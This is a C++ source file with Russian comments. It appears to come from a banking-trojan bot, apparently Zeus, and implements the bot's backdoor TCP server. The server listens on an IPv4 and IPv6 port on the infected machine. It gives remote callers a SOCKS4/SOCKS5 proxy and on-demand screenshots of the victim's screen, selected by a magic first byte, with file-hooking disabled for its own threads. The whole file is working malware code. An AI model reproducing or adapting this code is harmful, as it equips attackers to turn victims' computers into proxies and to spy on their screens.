#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "localsettings.h"
#include "tcpserver.h"
#include "screenshot.h"
#include "socks5server.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\wsocket.h"
#include "..\common\process.h"
#include "..\common\sync.h"

//Данные сокета.
typedef struct
{
  SOCKET s;     //Сокет.
  HANDLE event; //Событие FD_ACCEPT.
}SOCKETDATA;

/*
  Заполнение структуры SOCKETDATA.

  IN family - AF_INET или AF_INET6.
  IN port   - порт. Если равен 0, то выбирается произволный порт.
  OUT sd    - SOCKETDATA.

  Return    - true - в случаи успеха,
              false - в случаи ошибки.
*/
static bool createSocketData(int family, WORD port, SOCKETDATA *sd)
{
  if(port == 0)sd->s = WSocket::tcpListenRandom(family, SOMAXCONN, TCPSERVER_PORT_FIRST, TCPSERVER_PORT_LAST);
  else sd->s = WSocket::tcpListenEx(family, port, SOMAXCONN);

  if(sd->s != INVALID_SOCKET)
  {
    if((sd->event = CWA(kernel32, CreateEventW)(NULL, FALSE, FALSE, NULL)) != NULL)
    {
      if(CWA(ws2_32, WSAEventSelect)(sd->s, sd->event, FD_ACCEPT) == 0)
      {
        return true;
      }
      CWA(kernel32, CloseHandle)(sd->event);
    }
    WSocket::tcpClose(sd->s);
  }

  sd->s     = INVALID_SOCKET;
  sd->event = NULL;
  
  return false;
}

/*
  Удаление ресурсов занятых SOCKETDATA.

  IN sd - SOCKETDATA.
*/
static void freeSocketData(SOCKETDATA *sd)
{
  WSocket::tcpClose(sd->s);
  CWA(kernel32, CloseHandle)(sd->event);
}

/*
  Создание сокета для прослущивания на произволном порту.

  IN initialPort - предпочитаемый порт, или 0 для произволного.
  OUT ipv4Data   - IPv4-сокет.
  OUT ipv6Data   - IPv6-сокет.

  Return         - номер порта, на котором удалось влючить прослушивание. Или 0 в случаи ошибки.
*/
static WORD createListenSocket(WORD initialPort, SOCKETDATA *ipv4Data, SOCKETDATA *ipv6Data)
{
  WDEBUG1(WDDT_INFO, "initialPort=%u.", initialPort);
  if(initialPort != 0 && createSocketData(AF_INET, initialPort, ipv4Data))
  {
    createSocketData(AF_INET6, initialPort, ipv6Data);
    return initialPort;
  }

  if(createSocketData(AF_INET, 0, ipv4Data))
  {
    SOCKADDR_STORAGE sockAddr;
    int sockAddrSize = sizeof(SOCKADDR_STORAGE);
    if(CWA(ws2_32, getsockname)(ipv4Data->s, (sockaddr *)&sockAddr, &sockAddrSize) == 0)
    {
      initialPort = SWAP_WORD(((SOCKADDR_IN *)&sockAddr)->sin_port);
      WDEBUG1(WDDT_INFO, "New initialPort=%u.", initialPort);
    
      createSocketData(AF_INET6, initialPort, ipv6Data);
      return initialPort;
    }
    freeSocketData(ipv4Data);
  }

  WDEBUG0(WDDT_ERROR, "Failed to listen.");
  return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void TcpServer::init(void)
{


}

void TcpServer::uninit(void)
{

}

////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Поток для работы с S1 сессией.

  IN p   - сокет сессии.
  
  Return - 0.
*/
static DWORD WINAPI s1Proc(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);

  SOCKET s = (SOCKET)p;
  BYTE magicByte;
  
  WDEBUG0(WDDT_INFO, "Started."); 
  
  //Узнаем по первому байту, что от нас хотят.
  if(WSocket::tcpRecv(s, &magicByte, 1, 0) == 1)switch(magicByte)
  {
    //Сокс 5.
    case 5:
      Socks5Server::_start5(s, 0);
      break;

    //Сокс 4.
    case 4:
      Socks5Server::_start4(s, 0);
      break;
    
    //Скриншот.
    case 0:
    {
      WDEBUG0(WDDT_INFO, "Is screenshot session"); 
      
      //Читаем MIME.
      BYTE quality;
      BYTE mimeSize;

      if(WSocket::tcpRecvAll(s, &quality, 1,   0) && WSocket::tcpRecvAll(s, &mimeSize, 1, 0))
      {
        char mime[0xFF];
        if(mimeSize > 0 && WSocket::tcpRecvAll(s, mime, mimeSize, 0))
        {
          LPWSTR realMime = Str::_utf8ToUnicode(mime, mimeSize);
          if(realMime != NULL)
          {
            //Отправляем скриншот.
            Screenshoot::_screenToSocket(s, realMime, quality, 0);
            Mem::free(realMime);
          }
        }
      }
      break;
    }
  }

  WDEBUG0(WDDT_INFO, "Stopped.");
  WSocket::tcpClose(s);
  return 0;
}

/*
  Поток для принятия соединений.

  Return - 0.
*/
static DWORD WINAPI proc(void *)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_TCP_SERVER, MalwareTools::KON_GLOBAL);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed");
    return 1;
  }
  
  WDEBUG0(WDDT_INFO, "Started.");
  if(Core::isActive())
  {
    LocalSettings::SETTINGS ls;
    LocalSettings::getCurrent(&ls);

    //Принудительно пытаемся создать сокеты.
    SOCKETDATA s1Ipv4, s1Ipv6;
    WORD currentPort;
    while((currentPort = createListenSocket(ls.tcpPortS1, &s1Ipv4, &s1Ipv6)) == 0)
    {
      if(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 1000) != WAIT_TIMEOUT)break;
    }

    if(currentPort != 0) //Иначе сработало coreData.globalHandles.stopEvent.
    {
      //Если порт был изменен, сохраняем его.
      if(currentPort != ls.tcpPortS1)
      {
        LocalSettings::beginReadWrite(&ls);
        ls.tcpPortS1 = currentPort;
        LocalSettings::endReadWrite(&ls);
      }

      //Создаем карту событий.
      HANDLE events[3];
      DWORD eventsCount = 0;
      {
        events[eventsCount++] = coreData.globalHandles.stopEvent;
        if(s1Ipv4.event != NULL)events[eventsCount++] = s1Ipv4.event;
        if(s1Ipv6.event != NULL)events[eventsCount++] = s1Ipv6.event;
      }
      
      //Ждем событий.
      DWORD curEvent;
      while((curEvent = CWA(kernel32, WaitForMultipleObjects)(eventsCount, events, FALSE, INFINITE)) > WAIT_OBJECT_0 /*Т.е. пропускаем stopEvent*/ &&
            curEvent < WAIT_OBJECT_0 + eventsCount)
      {
        curEvent -= WAIT_OBJECT_0;
        
        //Определяем сокет.
        SOCKET clientSocket, incomingSocket;
        if(events[curEvent] == s1Ipv4.event)incomingSocket = s1Ipv4.s;
        else if(events[curEvent] == s1Ipv6.event)incomingSocket = s1Ipv6.s;
        
        //Принимаем соединение на сокете.
        while((clientSocket = CWA(ws2_32, accept)(incomingSocket, NULL, NULL)) != INVALID_SOCKET)
        {
          //Настраиваем сокет.
          CWA(ws2_32, WSAEventSelect)(clientSocket, NULL, 0);
          WSocket::setNonBlockingMode(clientSocket, false);
          WSocket::tcpDisableDelay(clientSocket, true);
          
          //Создаем поток сессии.
          if(Process::_createThread(128 * 1024, s1Proc, (void *)clientSocket) == 0)
          {
            WDEBUG0(WDDT_ERROR, "Failed to create thread.");
            WSocket::tcpClose(clientSocket);
          }
        }
      }

      //Освобождаем ресурсы.
      freeSocketData(&s1Ipv4);
      freeSocketData(&s1Ipv6);
    }
  }

  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

bool TcpServer::_create(ThreadsGroup::GROUP *group)
{
  return ThreadsGroup::_createThread(group, 0, proc, NULL, NULL, NULL);
}
